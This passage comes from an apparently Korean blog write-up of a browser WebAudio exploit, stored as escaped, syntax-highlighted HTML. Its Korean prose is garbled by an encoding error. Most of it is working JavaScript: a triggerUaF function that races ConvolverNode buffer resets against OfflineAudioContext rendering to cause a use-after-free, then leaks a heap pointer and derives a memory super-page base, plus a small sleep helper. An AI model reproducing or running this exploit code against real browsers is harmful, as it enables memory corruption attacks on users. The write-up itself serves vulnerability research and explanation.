        &lt;span class=&quot;nx&quot;&gt;iirFilters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createIIRFilter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;feedForward&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;feedback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;exploit ì´ˆë°˜ë¶€ëŠ” OfflineAudioContextë¥¼ ìƒì„±í•˜ê³  ë‘ ê°œì˜ floatì„ í†µí•´ ì´ˆê¸°í™”ë˜ëŠ” IIRFilterNode ê°ì²´ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;triggerUaF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;doneCb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;OfflineAudioContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bufferSource&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createBufferSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;convolver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createConvolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;scriptNode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createScriptProcessor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;channelBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
	&lt;span class=&quot;nx&quot;&gt;convolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;channelBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;bufferSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;channelBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
	&lt;span class=&quot;nx&quot;&gt;bufferSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;loop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;bufferSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;loopStart&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;bufferSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;loopEnd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
	&lt;span class=&quot;nx&quot;&gt;channelBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getChannelData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
	&lt;span class=&quot;nx&quot;&gt;bufferSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;convolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;convolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scriptNode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;scriptNode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;destination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
	&lt;span class=&quot;nx&quot;&gt;bufferSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
 
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
	&lt;span class=&quot;nx&quot;&gt;scriptNode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onaudioprocess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;evt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;channelDataArray&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;evt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inputBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getChannelData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
    		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;channelDataArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;channelDataArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;channelDataArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;channelDataArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            			&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;u64Array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigUint64Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            			&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;u32Array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;u64Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            			&lt;span class=&quot;nx&quot;&gt;u32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;channelDataArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            			&lt;span class=&quot;nx&quot;&gt;u32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;channelDataArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
 
            			&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;leakedAddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;byteSwapBigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;u64Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
            			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;leakedAddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
                			&lt;span class=&quot;nx&quot;&gt;leakedAddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x800000000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
             			&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;superPageBase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getSuperPageBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;leakedAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
	             		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;superPageBase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xFFFFFFFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;superPageBase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xFFFFFFFFFFFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                			&lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                			&lt;span class=&quot;nx&quot;&gt;evt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
                			&lt;span class=&quot;nx&quot;&gt;bufferSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;disconnect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                			&lt;span class=&quot;nx&quot;&gt;scriptNode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;disconnect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                			&lt;span class=&quot;nx&quot;&gt;convolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;disconnect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
 
                			&lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                     			&lt;span class=&quot;nx&quot;&gt;doneCb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;leakedAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                			&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
                			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
 
	&lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;startRendering&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
    		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        	 	&lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
       	  	&lt;span class=&quot;nx&quot;&gt;triggerUaF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;doneCb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
 
	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;nx&quot;&gt;convolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    		&lt;span class=&quot;nx&quot;&gt;convolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;channelBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    		&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;later&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// wait 100 millseconds&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì´í›„ Reverb componentì— í•„ìš”í•œ ê°ì²´ë“¤ì„ ìƒì„±í•˜ê³  OfflineAudioContextì™€ ë‘ê°œì˜ ConvolverNodeë¥¼ ìƒì„±í•˜ì—¬ UAFë¥¼ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;later&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Promise&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;resolve&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ í•¨ìˆ˜ë¥¼ ì¬ê·€ì ìœ¼ë¡œ í˜¸ì¶œí•˜ì—¬ ì˜¤ë””ì˜¤ ì±„ë„ ë²„í¼ë¥¼ 0ìœ¼ë¡œ ì±„ìš°ê³  ë Œë”ë§ì„ ì‹œì‘í•¨ê³¼ ë™ì‹œ ConvolverNodeë²„í¼ë¥¼ ì¬ì„¤ì •í•´ì„œ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤. ì—¬ê¸°ì„œ later í•¨ìˆ˜ëŠ” sleep í•¨ìˆ˜ì²˜ëŸ¼ í˜„ì¬ ìŠ¤ë ˆë“œë¥¼ ì¼ì‹œ ì¤‘ì§€í•˜ëŠ” ì—­í• ì„ í•©ë‹ˆë‹¤.&lt;/p&gt;

